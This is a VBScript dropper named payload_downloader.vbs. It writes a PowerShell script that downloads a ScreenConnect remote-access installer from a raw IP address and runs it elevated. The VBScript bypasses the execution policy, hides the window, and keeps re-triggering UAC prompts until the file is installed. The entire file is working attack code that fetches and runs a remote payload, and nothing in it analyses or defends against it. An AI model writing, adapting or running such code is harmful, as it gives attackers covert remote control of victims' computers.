' payload_downloader.vbs
Dim shell, fso, shellApp, psScriptPath, downloadUrl, payloadPath, psContent

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set shellApp = CreateObject("Shell.Application")

' Configuration
downloadUrl = "http://77.90.45.40:8040/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"
payloadPath = "C:\Program Files\ScreenConnect.ClientSetup.exe"
psScriptPath = "C:\ProgramData\run_payload.ps1"

' Create PowerShell script content
psContent = "$downloadUrl = '" & downloadUrl & "'" & vbCrLf
psContent = psContent & "$payloadPath = '" & payloadPath & "'" & vbCrLf
psContent = psContent & "try {" & vbCrLf
psContent = psContent & "    $webClient = New-Object System.Net.WebClient" & vbCrLf
psContent = psContent & "    $webClient.DownloadFile($downloadUrl, $payloadPath)" & vbCrLf
psContent = psContent & "    if (Test-Path $payloadPath) { Start-Process -FilePath $payloadPath -Verb RunAs }" & vbCrLf
psContent = psContent & "} catch {" & vbCrLf
psContent = psContent & "    exit" & vbCrLf
psContent = psContent & "}" & vbCrLf

' Write PowerShell script
Dim psFile
Set psFile = fso.CreateTextFile(psScriptPath, True)
psFile.Write psContent
psFile.Close

' Wait 30 seconds before first attempt to avoid immediate UAC prompt
WScript.Sleep 30000

' Loop until payload exists
Do
    ' Run PowerShell script with admin (UAC prompt will appear)
    shellApp.ShellExecute "powershell.exe", "-ExecutionPolicy Bypass -File """ & psScriptPath & """", "", "runas", 0
    ' Wait 30 seconds
    WScript.Sleep 30000
    ' If payload file exists, exit loop
    If fso.FileExists(payloadPath) Then
        Exit Do
    End If
Loop
